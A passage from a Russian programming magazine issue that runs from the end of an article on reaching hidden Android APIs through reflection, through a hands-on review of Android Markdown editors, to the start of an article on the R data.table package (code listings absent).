ключить ProGuard и снять ограничение на 65 тысяч методов  (multiDex):





Оставалось только дождаться окончания сборки.

И тут я подумал о рефлексии...
На самом деле все сказанное выше — пустая болтовня. Не потому, что этот
метод не работает, — он замечательно работает, и ты сам можешь в этом убе-
диться. Настоящая причина в том, что он невероятно избыточен, ведь есть
более адекватный альтернативный путь. Итак, внимание, код для вытягивания
шторки без замен фреймворков и возни с настройками Java и Gradle:





Все  просто.  Достаточно  было  использовать  рефлексию,  чтобы  пря-
мо во время исполнения найти класс StatusBarManager, найти его метод
expandNotificationsPanel() и вызвать. И все это без лишних телодвиже-
ний (кроме того, что после каждого редактирования код приходится запускать
для проверки).

Какие еще скрытые API существуют?
На самом деле их не так уж много. В основном Android использует скрытые API
для взаимодействия между системными классами, поэтому обычно это раз-
личные константы и подсобные функции, малоинтересные обычным програм-
мистам. Но есть и несколько полезных API, которые позволяют:
•  монтировать,  размонтировать  и  форматировать  файловые  системы
   (StorageManager);
•  получить расширенную информацию о Wi-Fi (WifiManager);
•  узнать UID и прочую информацию о текущем процессе (Process);
•  получить расширенную информацию о базовой станции (CellInfoLte);
•  узнать тип сети (ConnectivityManager);
•  получить список установленных пакетов, принадлежащих указанному юзеру
   (PackageManager);
•  узнать реальный размер экрана с учетом наэкранных кнопок навигации
    (Display).

Я не проверял все эти API, поэтому не буду давать гарантий, что они корректно
работают и не требуют каких-то привилегий в системе. Ты можешь проверить
сам — просто найди API в исходном коде, введя в поиске директиву @hide.
Удобнее всего сделать это с помощью веб-сервиса AndroidXRef: просто укажи
@hide в поле Full search, а в In project(s) выбери frameworks.





                               Ищем скрытые API в исходниках фреймворка

Мораль
Скрытые API и рефлексия позволили мне реализовать задуманное (если тебе
интересно, это чудо есть в маркете). Однако это всего лишь маленькая соф-
тинка, написанная для себя, и я настоятельно не рекомендую использовать
скрытые API в больших проектах, особенно если ты собираешься их монетизи-
ровать.
  В отличие от API с высоким уровнем доступа, наличие или неизменность
скрытых API не гарантирована. В следующей версии Android они могут исчез-
нуть или измениться, они могут существовать в прошивках одних аппаратов
и отсутствовать в других. Их использование — это всегда лотерея.
CODING





                                                                               Сергей Мельников
                                                                                                          mail@s-melnikov.net,
                                                                                                      www.s-melnikov.netТЕСТ
MARKDOWN-
РЕДАКТОРОВ
ДЛЯ ANDROID
ВЫЯСНЯЕМ, ЕСТЬ ЛИ У ПЛАНШЕТОВОДОВ
ВОЗМОЖНОСТЬ КОМФОРТНО ГЕНЕРИТЬ
КОНТЕНТ В MD-ФОРМАТЕ





Язык разметки Markdown сейчас весьма популярен: су-
ществуют десятки веб-сервисов, позволяющих легко раз-
бавлять строго текстовые мысли картинками, таблицами,
списками и прочими аксессуарами, и примерно столько
же редакторов для настольных операционных систем —
Windows, Mac OS, Linux/UNIX. За примерами использо-
вания Markdown можно вообще никуда не ходить — все
без исключения статьи для «Хакера» авторы пишут именно
в этой разметке. Сегодня мы выясним, как обстоят дела
на этом фронте у повелителей зеленых роботов со слад-
кими именами.

Говорит и показывает Wiki

Markdown — облегченный язык разметки, созданный с целью написания мак-
симально читабельного и удобного для правки текста, но пригодного для пре-
образования в языки для продвинутых публикаций (HTML, Rich Text и другие).
Первоначально создан в 2004 году Джоном Грубером и Аароном Шварцем.
Многие идеи языка были позаимствованы из существующих соглашений
по разметке текста в электронных письмах.
   Синтаксис языка построен на использовании специальных символов, бла-
годаря которым введенный текст автоматически преобразуется в дальнейшем
в заголовок, цитату, нумерованный или произвольный список, ссылку, картинку
и прочее.
   Например:

# Заголовок первого уровня (H1)
## Заголовок второго уровня (H2)
*данный текст будет набран курсивом*
**полужирное начертание**

На рис. 1 приведен пример исходного текста (слева) и после обработки син-
таксиса Markdown (справа). Это так называемый базовый синтаксис, которым
и будем тестировать наших участников.





                                                            Рис. 1. Просто и наглядно

В идеале хотелось бы, чтобы текст в мобильной версии выглядел примерно
так же.



ПОДГОТОВКА ЭКСПЕРИМЕНТА
В качестве помощника возьмем 10-дюймовый планшет средней ценовой ка-
тегории и средней же производительности, с уже почтенной ОС Android 4.0.4
на борту. Так как набирать текст, используя экранную клавиатуру, сродни ад-
скому наказанию грешников, я воспользуюсь Bluetooth-клавиатурой, заказан-
ной когда-то на просторах Aliexpress. А чтобы совсем уж сделать работу ком-
фортной, подключу к полноразмерному USB-порту (мегавещь, кстати) мышку.
Обзор каждого редактора (помимо теста синтаксиса Markdown) будем подго-
тавливать в нем самом, чтобы на практике ощутить все его достоинства и не-
достатки.

JPG vs PNG

Рассмотренные редакторы, поддерживающие вставку картинок формата JPG,
точно так же работают и с файлами PNG.


МЕТОДИКА
Итак, чем же должны обладать претенденты, чтобы надолго поселиться в тво-
ем Android-девайсе? Во-первых, как ни странно, поддержкой синтаксиса
Markdown: как правило, мобильные редакторы пасуют при вставке картинок
в текст или поддерживают не все возможности языка. Во-вторых, работой с ло-
кальными файлами и их синхронизацией с облачными хранилищами, ведь ко-
пировать файлы на флешки — прошлый век и моветон. В-третьих, поддержкой
русского языка как в интерфейсе, так и в проверке орфографии (отмечу, что
последняя уже присутствует в Android из коробки). В-четвертых, должно быть
субъективное чувство комфорта при работе с текстом — в конце концов, это
просто инструмент, который не должен мешать полету мысли и движению руки.

Лайфхак

Android хорошо умеет работать с внешними клавиатурами, однако переклю-
чение языка почему-то так толком и не реализовано. Отсутствует и индикация
текущей раскладки. Чтобы ликвидировать эти недочеты, из Google Play мож-
но установить стороннюю экранную клавиатуру, которая, помимо прочего, бу-
дет обслуживать и взаимодействие системы с физической. Например, Russian
Keyboard имеет наглядную индикацию и предлагает традиционные способы
переключения языка: Alt + Shift, Alt + Space или Shift + Space.



BANANATEXT / MARKDOWN
Ссылка: bit.ly/2bf5KRv
Версия: 0.5.1
Цена: бесплатно (есть платная версия)

Итак, запускаем наш любимый Google Play, вбиваем Markdown в строку по-
иска и «знакомимся» с нашим первым участником — BananaText / Markdown.
Знакомимся в кавычках, потому что с первой попытки этот текст почему-то
не сохранился (помнишь, я говорил, что буду писать в самом редакторе, —
не соврал ;)). Приложение выполнено в псевдо Material стиле — кроме серой
кнопки (Floating Action Button), в окне редактора ничего и нет. В смысле — во-
обще ничего! И это совсем плохо, так как при работе с текстом очень хочет-
ся его периодически сохранять (рефлекс, привитый Microsoft Office), а сделать
это можно, только завершив правку нажатием той самой кнопки с возвратом
на главный экран, что дико раздражает. Приложение не позволяет установить
размер шрифта и межстрочное расстояние — о комфорте для глаз можно за-
быть, а вместо расово верных переносов слова просто разрываются в произ-
вольном (!) месте.

JPG vs PNG

Забегая вперед, замечу, что при тестировании многих приложений наблюда-
ется странная тенденция, при которой сам редактор текста сделан из рук вон
плохо, тогда как отформатированный вариант в Markdown смотрится отлично.





                                       Рис. 2. Серая полоса внизу — рекламный баннер

Есть проблемы и в логике приложения — так, при нажатии кнопки «Назад»
в окне настроек (к слову, состоящем ровно из одного сомнительного пункта)
приложение завершает свою работу. Непонятно почему, никакой проверки
орфографии нет (напомню — она встроена в систему по умолчанию). С об-
лачной синхронизацией дела обстоят не лучше: она имеется только в платной
версии и только в режиме чтения, то есть ты можешь открыть файл для редак-
тирования из Dropbox, но вот сохранить его будь любезен в памяти устрой-
ства. Отдельно стоит отметить периодические глюки и аварийное завершение
работы с потерей текста.
   А как обстоят дела с синтаксисом Markdown? Имеется поддержка разноо-
бразных стилей текста и заголовков, вставка списков, ссылок и даже картинок,
но последние зачем-то масштабируются по ширине страницы. BananaText —
единственный из рассмотренных редакторов, позволяющий вставлять в текст
таблицы. Код и выделенные слова обрамляются рамками с фоном, а вот у ци-
тат отсутствует полоска слева. Теперь о грустном: чтобы посмотреть отфор-
матированный текст, необходимо вернуться (!) на главный экран, где присут-
ствует область предпросмотра с неубираемым боковым меню. Да, с таким
интерфейсом начинаешь уважать даже vi.
Вердикт: приложение французских разработчиков выполнено крайне небрежно,
из-за чего юзабилити находится явно ниже ватерлинии, а значит, плывем дальше.
   P. S. Приложение снова упало, похоронив половину написанного выше.

MARKUPNOTES
Ссылка: bit.ly/2brBc3k
Версия: 2.0
Цена: бесплатно

Следующим рассмотрим редактор от немецких разработчиков — MarkupNotes.
Приложение абсолютно бесплатно и не содержит рекламных баннеров, что
приятно. Интерфейс не локализован, но поддержка русского языка при про-
верке орфографии присутствует — слова с ошибками подчеркиваются, пред-
лагается замена по словарю. К сожалению, так же как и в предыдущем слу-
чае, невозможно задать размер шрифта и межстрочный интервал, более
того — в режиме редактирования жестко выбрана цветовая схема с белыми
буквами на черном фоне, что, на мой взгляд, должно быть опционально. Все
новые файлы программа складывает на карту памяти в отдельную папку (в на-
стройках можно указать свою), создавая при этом общее оглавление. К мое-
му сожалению, кнопка «Сохранить» закрывает редактор и переключает режим
на просмотр отформатированного текста (похоже, авторы никогда не работа-
ли с большими и сложными в плане графики текстами).
   Поддержка Markdown удовлетворительная: учитываются все уровни заго-
ловков, распознается различное начертание текста, есть возможность встав-
лять цитаты и ссылки, а также нумерованные и ненумерованные списки. Также
распознается управляющий символ  `, позволяющий выделить нужные слова
(термины) в тексте. Огорчает только то, что ни код, ни термины не обрамля-
ются рамками — меняется только шрифт, а у цитат отсутствует серая полоска
с левой стороны. Картинки можно вставлять как локальные (с указанием пол-
ного пути или без), так и расположенные в интернете.





                                          Рис. 3. Без рамок текст смотрится аляповато

Поддержка облачных сервисов отсутствует. Документом можно только поде-
литься (Share) с помощью установленных на планшете клиентов (Google Диск,
Gmail и прочих), но это целиком и полностью заслуга Android, а не разработ-
чиков приложения. Кроме того, если использовать меню Share, то скопирован
будет отформатированный HTML-вариант, а не исходный текстовый файл —
учти это.
Вердикт:: приложение вполне пригодно для написания текстов, особенно
на слабых планшетах с ограниченным объемом памяти, так как размер приложе-
ния составляет рекордные 180 Кбайт. Работает оно довольно шустро, но, если
тебе нужна полноценная облачная синхронизация, стоит поискать альтернативу.

TEXTIE MARKDOWN EDITOR
Ссылка: bit.ly/2b1uxeb
Версия: 1.1.2
Цена: бесплатно

Разработка вьетнамских программистов Textie Markdown Editor отличается
своеобразным интерфейсом. Когда файл открываешь, на экране отобража-
ется уже отформатированный вариант текста, и понять, как же начать с ним
работать, решительно невозможно. Оказывается, нужно сделать свайп вле-
во в области текста, чтобы перейти в режим редактирования. По ощущени-
ям, на экране присутствуют старые добрые табы, только без заголовков и ка-
кой-либо индикации, — очень странная и неочевидная реализация. С другой
стороны, если чуть довести это решение со свайпом до конца — получится
самый удобный, на мой взгляд, вариант переключения «редактор — предпро-
смотр». Кроме того, на Android 4 в оформлении приложения используются
явно ошибочные цвета: диалог выбора файла рисует черные надписи на тем-
но-сером фоне, да и на скриншоте заметно, как не вписываются кнопки в об-
щую цветовую гамму. Портит впечатление и известная «детская болезнь»
некоторых разработчиков — поворот экрана, при котором приложение про-
сто-напросто падает (похоронив под своими обломками все сделанные тобой
правки текста).
   Интерфейс не русифицирован, но проверка орфографии работает. Вы-
брать размер шрифта исходного текста, так же как и межстрочный интервал,
не представляется возможным (уж не заговор ли это?).
  О Markdown, собственно, говорить нечего — тест пройден на самом вы-
соком уровне: форматирование полностью соответствует ожиданиям. Един-
ственная придирка — необходимость указывать полный путь до изображения
при вставке, то есть, например, /mnt/sdcard/download/sample.jpg.





                                                                 Рис. 4. Тест пройден

В режиме редактирования имеются кнопки для быстрой вставки картинок, ци-
тат, списков и ссылок. Для периодического сохранения изменений авторы
предлагают синхронизацию с помощью своего сервиса (хм... начинает про-
сыпаться внутренний параноик) с обязательной регистрацией. Понятно, что
в этом случае ожидать работы с другими облачными сервисами не стоит.
   Хорошо продумана функция экспорта готового текста: помимо ожидаемо-
го HTML и MD, на выходе можно получить документ в виде изображения фор-
мата PNG.
Вердикт: по части Markdown все прекрасно, но хромает юзабилити (чего только
стоит банальный поворот экрана). Если приспособиться к интерфейсу — рабо-
тать можно, хотя чувство, что сейчас приложение аварийно завершится, сильно
мешает.

WRITER PLUS
Ссылка: bit.ly/1ZFOzvg
Версия: 1.42
Цена: бесплатно

Следующим в очереди за наградой стоит редактор с незатейливым именем
Writer Plus. Интерфейс, выполненный в стиле Material Design, полностью лока-
лизован, имеется проверка орфографии по правилам русского языка. Размер
шрифта при наборе текста установить нельзя, тем не менее он вполне подхо-
дит для комфортной работы (используется шрифт с засечками). Кнопка «Со-
хранить» по-прежнему отсутствует (видимо, это какой-то тренд), и все измене-
ния сохраняются по окончании правки или при использовании клавиатурного
сочетания Control + S (уже что-то).
   При тестировании обнаружилось некоторое неудобство — отсутствовала
опция выбора файла: пришлось вручную копировать тестовый файл непосред-
ственно в папку с программой, после чего он ожидаемо появился в главном
меню. Ставим минус за юзабилити. С поддержкой Markdown тоже не все в по-
рядке — поддерживаются только различные уровни заголовков (H1, H2, H3)
да стили текста (курсив и/или жирный). Ни картинку, ни цитату, ни код, ни даже
ссылку вставить не удалось.





                                                              Рис. 5. Рекурсия статьи

Облачная синхронизация отсутствует (правда, автор все же предлагает поста-
вить дополнительное приложение для работы с Google Диском). Есть возмож-
ность поделиться (Share) готовым текстом, но, как уже отмечалось, это опция
мобильной системы, а не конкретного приложения.
Вердикт: приложение представляет собой неплохой текстовый редактор (не
в последнюю очередь из-за удачно подобранного шрифта), но наш тест, к сожа-
лению, провалило.

                           Продолжение статьи
CODING



    Начало статьи
ТЕСТ MARKDOWN-
РЕДАКТОРОВ
                                                                                Сергей Мельников
                                                                                                            mail@s-melnikov.net,
                                                                                                        www.s-melnikov.netДЛЯ ANDROID
ВЫЯСНЯЕМ, ЕСТЬ ЛИ У ПЛАНШЕТОВОДОВ
ВОЗМОЖНОСТЬ КОМФОРТНО ГЕНЕРИТЬ
КОНТЕНТ В MD-ФОРМАТЕ



IA WRITER
Ссылка: bit.ly/2bodAta
Версия: 1.3.9
Цена: бесплатно

Мода добавлять префикс i к названию продукта, видимо, еще долго будет бе-
редить умы разработчиков мобильных приложений и маркетологов. Посмо-
трим, поможет ли эта буква с точкой немецкому редактору iA Writer.
   После первого запуска приложения открывается небольшая справка,
в которой авторы благодарят некоего пользователя за перевод интерфейса
на русский язык. Лучше бы они этого не делали — локализация просто отвра-
тительная! Мало того что слова при склонении образуют причудливые языко-
вые конструкции — понять отдельные термины невозможно в принципе. На-
пример, «Частное» означает выбор памяти планшета для создания нового
файла, вместо традиционного меню «Правка» указано «Изменить», вместо
«Опции просмотра» сбивающий с толку «Просмотр» и так далее.
   Вообще, навигация построена на череде экранов (на манер горизонталь-
ной карусели): «Настройка   Выбор файла   Редактирование   Предпро-
смотр   Экспорт». Решение, прямо скажем, удачное, но вот реализация силь-
но хромает — кнопка «Назад» часто делает то, чего от нее совсем не ждешь:
вместо возврата на предыдущий экран внезапно завершает работу приложе-
ния.
   Наконец-то можно задать размер шрифта по желанию, а вот проверку ор-
фографии активировать так и не удалось, так же как и найти кнопку быстрого
сохранения изменений в тексте — только с переключением на другой экран.





                                                                  Рис. 6. йА писатель

С синтаксисом Markdown почти все в порядке — тест успешно пройден. «Поч-
ти» относится к цитатам, которые не отделяются от основного текста отступа-
ми и серой полосой, а отличаются только размером и начертанием шрифта.
При вставке картинок необходимо использовать полные пути. В режиме пред-
просмотра предлагаются различные шаблоны форматирования текста. Прав-
да, большинство из них игнорирует разметку Markdown, если она относится
к словам из русских букв (привет, 2000-е).
  Во время набора этого текста слово «ссылки» непостижимым образом
превратилось в нечто (!) — можешь полюбоваться на рис. 7. Любая попытка
исправить это безобразие ни к чему не приводила — повторное открытие до-
кумента лишь множило эти ритуальные кракозябры.




                                                                        Рис. 7. WTF?

iA Writer — первое приложение в обзоре с полноценной облачной синхро-
низацией через Google Диск и Dropbox (чтение и запись документов). На этом
фоне несколько удивительно устроено взаимодействие с локальными файла-
ми — их нельзя... открыть, можно только создать новый документ (подсунуть
файл также не получилось, потому что рабочей папки нет). Единственный вы-
ход — запустить редактирование кликом на конкретном файле с помощью сто-
роннего файлового менеджера и выбрать рассматриваемое приложение в ка-
честве редактора.
Вердикт: хорошая поддержка синтаксиса Markdown и облачная синхрониза-
ция — несомненные плюсы, кривая локализация и отсутствие проверки орфо-
графии — минусы. Если последние некритичны, пользоваться можно (только
не пиши это дьявольское слово «ссылки»!).

MARKDROP
Ссылка: bit.ly/2bpng5X
Версия: 1.1.1
Цена: бесплатно

По аскетичности редактор MarkDrop даст фору даже такому адепту простоты,
как рассмотренный ранее BananaText. Весь интерфейс состоит из двух пун-
ктов меню и кнопки создания нового документа, то есть никакой локализации
как бы и не требуется. Отсюда сразу же возникает сложность с открытием те-
стового файла, так как, собственно, открыть его нечем — диалог выбора фай-
ла попросту отсутствует. Как и в случае с iA Writer, загружаем наш файл с по-
мощью стороннего файлового менеджера.
   Интерфейс радует наличием сразу двух панелей — исходного редактора
и области предпросмотра готового текста. В нижней части расположены кноп-
ки быстрой вставки заголовков, списков, стилей текста и цитат, а вот места
для кнопки «Сохранить», как всегда, не нашлось. Проверка орфографии име-
ется, словарь тоже.
   Выбрать место для сохранения нового файла нельзя, рабочей папки как та-
ковой не существует — все файлы программа складывает в свой каталог
(Android/data/net.keepzero.markdrop/files/). Никакого экспорта не пред-
усмотрено, дескать, доставай труды своей работы сам, если сможешь. Жир-
ный минус в юзабилити.





                                                    Рис. 8. Двухпанельный интерфейс

Может быть, поддержка Markdown уверенно перевесит все минусы? Увы, даже
здесь есть к чему придраться. Как ты сам видишь на скриншоте, с заголов-
ком, ненумерованным списком и начертанием текста все в порядке, так же
как и со ссылкой, а вот все остальное — печаль. Цитата распознается, но так
слабо выделяется, что убери > — и разницы не почувствуешь. Та же история
и с кодом: обрамляющая рамка отсутствует, и все сливается в единый текст.
Отдельные термины тоже не обрамляются, но, по крайней мере, визуально вы-
деляются шрифтом. Изображение вставить мне так и не удалось: то ли прило-
жение не поддерживает такую возможность, то ли картинка не той системы :).
   Облачная синхронизация, как ни странно, поддерживается, но только
для сторонников Dropbox.
Вердикт: приложение можно было бы порекомендовать к употреблению тем,
кто работает с текстами исключительно через Dropbox, но посредственная под-
держка синтаксиса Markdown убивает даже и этот кейс использования. Одним
словом — следующий!

TAKEDOWN: A MARKDOWN EDITOR
Ссылка: bit.ly/2bq4dLr
Версия: 1.0.1
Цена: бесплатно

Takedown: A Markdown Editor, пожалуй, самый недружелюбный редактор
из всех рассмотренных. Для начала у него, как и у некоторых коллег, нет оп-
ции открытия и сохранения файлов. Более того, запустив тестовый образец
из внешнего файлового менеджера, получаем... аварийное завершение при-
ложения (та же картина и с любым другим файлом). На этом можно было бы
и закончить обзор, однако дадим приложению еще один шанс.
  В системе Android есть буфер обмена: скопируем в него тестовый образец
и вставим в новый документ — этот вариант сработал, можно оценивать ре-
зультат.
   Поддержка Markdown визуально неплоха, но, к примеру, заставить картин-
ку отображаться так и не удалось (ни смена формата на PNG, ни манипуляции
с путем файла не помогли). Все остальные элементы форматируются нор-
мально, и даже у цитат есть полоска слева, а код и термины обрамляются рам-
кой и фоном.





                                                   Рис. 9. Какая откормленная кнопка!

Приложение не работает с облачными сервисами, но позволяет передать го-
товую заметку с помощью меню Share. Рабочей папки нет, все новые докумен-
ты программа усиленно прячет в своих недрах, создавая на главном экране
вереницу Material-карточек. Кстати, чтобы начать работу с сохраненным ра-
нее документом, нужно сделать на соответствующей ему карточке свайп, так
как простое нажатие открывает лишь окно предпросмотра (неочевидное ре-
шение).
   Минималистский интерфейс общается с пользователем только на англий-
ском языке, но проверяет орфографию и на русском.
Вердикт:: приложение подходит для написания скорее небольших заметок,
нежели серьезных текстов.

NOTAL
Ссылка: bit.ly/2bf8Gxu
Версия: 1.3.3
Цена: бесплатно

Последний участник нашего марафона — Notal. Приложение не русифици-
ровано, но орфографию проверяет исправно. Размер шрифта можно задать
в настройках, однако это касается только режима предпросмотра. В режиме
редактирования наконец-то появилась нормальная кнопка «Сохранить», кото-
рая выполняет ровно одну функцию — сохраняет изменения и не завершает
работу с документом. Межстрочный интервал не отрегулируешь, зато можно
выбрать светлую или темную тему оформления.
   Опции выбора файла для открытия и сохранения нет, так же как и рабочей
папки — все документы сохраняются где-то внутри каталога приложения. Вна-
чале никак не удавалось открыть тестовый файл, так как программа не реги-
стрирует себя в качестве текстового редактора и не маячит в списке при клике
на файл. Впрочем, потом все же была найдена соответствующая опция в на-
стройках — непонятно только, почему она выключена по умолчанию.
   Поддержка Markdown находится на среднем уровне — отображается все,
кроме картинок. Режим предпросмотра активизируется кнопкой на панели
действий или же на главном экране приложения. Кстати, в окне предпросмо-
тра имеется какой-то косяк в элементах GUI — две панели с заголовком и две
кнопки «Назад» со стрелками (рис. 10).





                                             Рис. 10. Markdown на фоне двух Action Bar

Облачные сервисы Notal неинтересны, а вот поделиться (Share) работой оно
способно: можно выбрать как исходный текстовый вариант, так и HTML.
Вердикт:: кнопка сохранения — единственный плюс приложения, в осталь-
ном редактор смотрится блекло — как в удобстве работы, так и в синтаксисе
Markdown.

ВЫВОДЫ
В нашем сегодняшнем обзоре однозначного победителя нет: у кого-то хо-
рошо реализована поддержка Markdown, но не хватает облачной синхрони-
зации (Textie Markdown Editor, BananaText), у кого-то наоборот (MarkDrop).
Юзабилити также находится на самом разном уровне — где-то все очевидно
(BananaText), где-то требуется привыкание и практика (Takedown: A Markdown
Editor, MarkDrop).
   Условными победителями можно считать приложения Textie Markdown
Editor и iA Writer, так как они наиболее близко подошли к выполнению постав-
ленной задачи. От себя не могу не отметить редактор Writer Plus — работать
с текстом в нем было наиболее комфортно.
   А пока очень хочется собрать всех авторов вместе и... нет, не утопить, а объ-
единить их усилия для создания одного, но качественного приложения.

Share в вопросах и ответах


Опция Share (или «Поделиться») присут-
ствует почти в каждом Android-приложении
и работает очень просто. Допустим, мы раз-
работчики и хотим внедрить возможность
поделиться текстом. Все, что нужно сде-
лать, — отправить системе специальное на-
мерение (Intent), указав в качестве форма-
та данных plain/text. Тогда все приложения,
поддерживающие отправку текста, отклик-
нутся, и на их основе будет сформирован
список, который увидит пользователь. На-
пример, если в системе установлен Google
Диск,  текст можно поместить  в облако
Google, если клиент Dropbox — в его обла-
ко, если настроен Gmail — отправить по по-
чте и так далее. Никакого серьезного кода
нам самим писать не нужно. Понятно, что
такая передача однонаправленная, и на-
звать ее синхронизацией можно  только
с очень большой натяжкой. Именно поэто-
му в обзоре эти термины разнесены: Share
рассматривается как крайний случай, когда
синхронизации нет, а текст в облаке полу-                                                         Рис. 11. А не послать ли нам...
чить все-таки хочется.
    CODING
   DATA.TABLE —
   ТАБЛИЦЫНА
СТЕРОИДАХ                     СКОРОСТИ       R                                 ЯЗЫКЕ           МАКСИМУМ         В   ВЫЖИМАЕМ           ДАННЫМИ          С ТАБЛИЧНЫМИ       РАБОТЕ   ПРИ
                                                                          Чистяков
                                                                Станиславstas.chistyakov@hotmail.com,технологиям                                                                    по облачным                                                                           эксперт     обучению                                                     и машинному





    К чему лишние слова? Ты же читаешь
     статью про скорость, поэтому давай
     сразу к сути! Если у тебя в проекте идет
    работа с большим объемом данных         WWW
    и на трансформацию таблиц тратится          Тема языка R не впервые
                                                                                поднимается в нашем
    больше времени, чем хотелось, то data.       журнале. Подкинем тебе
     table поможет решить эту проблему.         еще паруполинковтеме:на статьи
     Статья будет интересна тем, кто уже не-              https://xakep.                                                                                             ru/2015/07/23/data-
    много знаком с языком R, а также разра-            analysis-r-part-1/
                                                                                                         https://xakep.     ботчикам, которые его активно исполь-
                                                                                          ru/2015/04/20/195-
                                                                                           learning-r-programming-     зуют, но еще не открыли для себя пакет
                                                                                               language/
     data.table.

    УСТАНАВЛИВАЕМ ПАКЕТЫ
     Все необходимое для нашей сегодняшней статьи можно проинсталлить с по-
     мощью соответствующих функций:





    R АТАКУЕТ
     В последние годы язык R заслуженно набирает популярность в среде машин-
      ного обучения. Как правило, для работы с этим подразделом искусственного
      интеллекта необходимо загрузить данные из нескольких источников, провести
      с ними преобразования для получения обучающей выборки, на ее основе со-
      здать модель, а затем использовать эту модель для предсказаний.
        На словах все просто, но в реальной жизни для формирования «хорошей»
      и устойчивой модели требуется множество попыток, большинство из которых
      могут быть абсолютно тупиковыми. Язык R помогает упростить процесс соз-
      дания такой модели, так как это эффективный инструмент анализа табличных
      данных. Для работы с ними в R существует встроенный тип данных data.frame
      и огромное количество алгоритмов и моделей, которые его активно исполь-
       зуют. К тому же вся мощь R заключается в возможности расширять базовую
      функциональность с помощью сторонних пакетов. В момент написания мате-
      риала их количество в официальном репозитории достигло 8914.
         Но, как говорится, нет предела совершенству. Большое количество паке-
      тов позволяют облегчить работу с самим типом данных data.frame. Обычно
       их цель — упростить синтаксис для выполнения наиболее распространенных
       задач. Здесь нельзя не вспомнить пакет dplyr, который уже стал стандартом
      де-факто для работы с data.frame, так как за счет него читаемость и удобство
      работы с таблицами выросли в разы.
        Перейдем от теории к практике и создадим data.frame DF со столбцами a,
      b и с.





      Если мы хотим:
      •  выбрать только столбцы a и с,
      •  отфильтровать строчки, где a = 2 и с > 10,
      •  создать новую колонку aс, равную сумме a и с,
      •  записать результат в переменную DF2,
        базовый синтаксис на чистом data.frame будет такой:





    С помощью dplyr все гораздо нагляднее:




      Эти же шаги, но с комментариями:





      Есть и альтернативный подход для работы с таблицами — data.table. Фор-
      мально data.table — это тоже data.frame, и его можно использовать с су-
     ществующими функциями и пакетами, которые зачастую ничего не знают
      о data.table и работают исключительно с data.frame. Этот «улучшенный»
      data.frame может выполнять многие типовые задачи в несколько раз быстрее
      своего прародителя. Возникает законный вопрос: где подвох? Этой самой
      «засадой» в data.table оказывается его синтаксис, который сильно отлича-
      ется от оригинального. При этом если dplyr с первых же секунд использова-
      ния делает код легче для понимания, то data.table превращает код в чер-
      ную магию, и только годы изучения колдовских книг несколько дней практики
      с data.table позволят полностью понять идею нового синтаксиса и принцип
      упрощения кода.

    ПРОБУЕМ DATA.TABLE
      Для работы с data.table необходимо подключить его пакет.


     В дальнейших примерах эти вызовы будут опущены и будет считаться, что па-
       кет уже загружен.
         Так как данные очень часто загружаются из файлов CSV, то уже на этом
      этапе data.table может удивлять. Для того чтобы показать более измери-
     мые оценки, возьмем какой-нибудь достаточно большой файл CSV. В каче-
      стве примера можно привести данные с одного из последних соревнований
      на Kaggle. Там ты найдешь тренировочный файл CSV (zip) размером в 1,27
       Гбайт. Структура файла очень простая:
      •  row_id — идентификатор события;
      •  x, y — координаты;
      •  accuracy — точность;
      •  time — время;
      •  place_id — идентификатор организации.

      Попробуем воспользоваться базовой функцией R — read.csv и измерим
      время, которое понадобится для загрузки этого файла (для этого обратимся
       к функции system.time):




     Время выполнения — 461,349 секунды. Достаточно, чтобы сходить за кофе...
     Даже если в будущем ты не захочешь пользоваться data.table, все равно
      старайся реже применять встроенные функции чтения CSV. Есть хорошая би-
      блиотека readr, где все реализовано гораздо эффективнее, чем в базовых
      функциях. Посмотрим ее работу на примере и подключим пакет. Дальше вос-
      пользуемся функцией загрузки данных из CSV:





     Время выполнения — 38,067 секунды — значительно быстрее предыдущего
       результата! Посмотрим, на что способен data.table:




     Время выполнения — 20,906 секунды, что почти в два раза быстрее, чем
      в readr, и в двадцать раз быстрее, чем в базовом методе.
       В нашем примере разница в скорости загрузки для разных методов полу-
      чилась достаточно большая. Внутри каждого из используемых методов время
      линейно зависит от объема файла, но разница в скорости между этими мето-
      дами сильно зависит от структуры файла (количества и типов столбцов). Ниже
      указаны тестовые замеры времени загрузки файлов.
        Для файла из трех текстовых колонок видно явное преимущество fread:





      Если же считываются не текстовые, а цифровые колонки, то разница между
      fread и read_csv менее заметна:





      Если после загрузки данных из файла ты собираешься дальше работать с data.
      table, то fread сразу его возвращает. При других способах загрузки данных
      будет необходимо сделать data.table из data.frame, хотя это просто:





      Большинство оптимизаций по скорости в data.table достигается за счет ра-
      боты с объектами по ссылке, дополнительные копии объектов в памяти не соз-
      даются, а значит, экономится время и ресурсы.
        Например, ту же задачу создать data.table из data.frame можно было бы
      решить одной командой на «прокачку», но надо помнить, что первоначальное
      значение переменной будет потеряно.





       Итак, данные мы загрузили, пора с ними поработать. Будем считать, что в пе-
      ременной DT уже есть загруженный data.table. Авторы пакета используют
      следующее обозначение основных блоков DT[i, j, by]:
      •     i — фильтр строк;
      •     j — выбор колонок или выполнение выражения над содержимым DT;
      •  by — блок для группировки данных.

     Вспомним самый первый пример, где мы использовали data.frame DF,
      и на нем протестируем различные блоки. Начнем с создания data.table
      из data.frame:




     Блок i — фильтр строк
      Это самый понятный из блоков. Он служит для фильтра строк data.table, и,
      если больше ничего дополнительно не требуется, остальные блоки можно
      не указывать.





     Блок j — выбор колонок или выполнение выражения
     над содержимым data.table
     В данном блоке выполняется обработка содержимого data.table с отфиль-
      трованными строками. Ты можешь просто попросить вернуть нужные столб-
       цы, указав их в списке list. Для удобства введен синоним list в виде точ-
      ки (то есть list (a, b) эквивалентно .(a,  b)). Все существующие в data.
      table столбцы доступны как «переменные» — тебе не надо работать с ними
       как со строками, и можно пользоваться intellisense.





     Можно также указать дополнительные колонки, которые хочешь создать,
      и присвоить им необходимые значения:


      Если все это объединить, можно выполнить первую задачу, которую мы пробо-
      вали решать разными способами:


     Выбор колонок — всего лишь часть возможностей блока j. Также там можно
      менять существующий data.table. Например, если мы хотим добавить новую
      колонку в существующем data.table, а не в новой копии (как в прошлом при-
      мере), это можно сделать с помощью специального синтаксиса :=.



    С помощью этого же оператора можно удалять колонки, присваивая им значе-
      ние NULL.



      Работа с ресурсами по ссылке здорово экономит мощности, и она гораздо
      быстрее, так как мы избегаем создания копии одних и тех же таблиц с разными
      колонками. Но надо понимать, что изменение по ссылке меняет сам объект.
      Если тебе нужна копия этих данных в другой переменной, то надо явно указать,
       что это отдельная копия, а не ссылка на тот же объект.
        Рассмотрим пример:



     Может показаться, что мы поменяли только DT3, но DT2 и DT3 — это один объ-
